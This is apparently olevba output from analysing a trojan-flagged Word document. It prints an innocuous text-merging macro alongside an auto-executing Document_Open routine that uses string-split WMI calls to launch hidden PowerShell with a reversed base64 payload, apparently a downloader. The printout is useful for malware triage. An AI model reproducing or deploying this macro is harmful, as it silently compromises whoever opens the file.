olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan.MSOffice.SAgent.gen-503a0e2f91b23d62d132afe73ea8ef7abb831876cdd79f5977430f681d5ca664
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: HEUR-Trojan.MSOffice.SAgent.gen-503a0e2f91b23d62d132afe73ea8ef7abb831876cdd79f5977430f681d5ca664 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub MergeTextFiles()
    
    Dim fs As Object
    Dim vSourceFile As Object, vNewFile As Object
    Dim vDialog As FileDialog
    Dim vPath As String, vFileContent As String
    Dim vFile As Variant
    Dim m As Long
    
    Set fs = CreateObject("Scripting.FileSystemObject")

    'Abre o dialog para selecao de arquivos
    Set vDialog = Application.FileDialog(msoFileDialogFilePicker)
    With vDialog
        .AllowMultiSelect = True
        .Title = "Selecione todos os arquivos texto e clique em OK"
        .InitialView = msoFileDialogViewList
        .Filters.Clear
        .Filters.Add "Arquivos texto", "*.txt"
        .Show
    End With
    
    'Verifica se foram selecionados os arquivos TXT
    If (vDialog.SelectedItems.Count > 0) Then
       
        'Recebe o caminho do diretorio
        vPath = fs.GetParentFolderName(vDialog.SelectedItems(1))
        
        'Cria o novo arquivo
        Set vNewFile = fs.CreateTextFile(vPath & "\arquivos_juntados.txt")
        
        'Percorre o array de arquivos selecionados
        For Each vFile In vDialog.SelectedItems
            
            'Le todo o conteudo do arquivo de origem
            'Salva no arquivo novo e fecha o arquivo de origem
            Set vSourceFile = fs.OpenTextFile(vFile, 1)
            vFileContent = vSourceFile.ReadAll
            vSourceFile.Close
            vNewFile.WriteLine vFileContent
            
        Next vFile
        
        'Fecha o arquivo novo
        vNewFile.Close
        
    Else
        Exit Sub
    End If
    
    m = MsgBox("Arquivos mesclados com sucesso!", vbInformation, "Mensagem")
    
End Sub

Sub Document_Open()
Call GetObject("win" + "mgmts:ro" + "ot\c" + "imv2:Wi" + "n32_P" + "ro" + "cess"). _
Create(StrReverse("AEHAmBQZAIHA0B" + "AIAQHAzBQaAwEA" + "0BgbAUGAtBQdAcGAyBQQA" + "0CAgAQbA8GAjB" + "gLA8GAkBQaAYHAgAwcAMHAlBwYA8GAyBAUA0CA" + "0BgcAEGA0BwUAA" + "CAgAwOAEHAmBQZAIHA0BAIAEGAyBQZAYGAzBAIAUGAkBwbAMGAlBAZA0CA" + "gAAbAkGA0BQdAQHAyBQZAMGAgAwOAICAQBQT" + "AUEAUBgOAYHAuBQZAQCAiAAIAgGA0BQYAAF" + "AtAAIA4GAvBQaAQHAhBwYA8GAMBQLAQHAlBwUAACA7AgIA0GAvBwYA4CA6BgbAkF" + "A6BAXAAFANBQRAQFA6AgdA4GAlBAJAICAsAgIAEGAyBQZAYGAz" + "BAXAAFANBQRAQFA6AgdA4GAlBAJAICA" + "sAgIA0GAvBwYA4CAvBAZAkGA2BAXAAFA" + "NBQRAQFA6AgdA4GAlBAJAICAgAgbA8GApBAdAEGAuBQaAQHAzBQZAQEAtAA" + "IAQHAhBAZA4CA6B" + "gbAkFA6BwLAUGA0BQaAMHAuA" + "wNAAHAyBwbAMGAvA" + "wLAoDAwBAdAQHAoBALAQHAhBAZA4CALBgaAUGA" + "HBwLAUGA0BQaAMHAuAwNAAHAyBwbAMGAvAwLAoDAwBAdAQHAoBALAQHAhBAZA4CABBgb" + "AUGALBwLAUGA0BQaAMHAuAwNA" + "AHAyBwbAMGAvAwLAoDAwBAdAQHAoBAIAUGAjBgcAUHAvBwUA0CAgAgcAUGAmBwcA4GAhBgcAQFAzBAdAkGACBQLAQHAyBQ" + "YAQHATBAIAsDAyBQZAYGAzBgbAEGAyBAVAMHA0BQaAIEAgAQZAwGA1BAZA8GANBQLAQHAyBwbAAHAtBQS ne- neddih elytswodniw- llehsrewop"), Null, Null, TerfajK)

End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|CreateTextFile      |May create a text file                       |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|StrReverse          |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

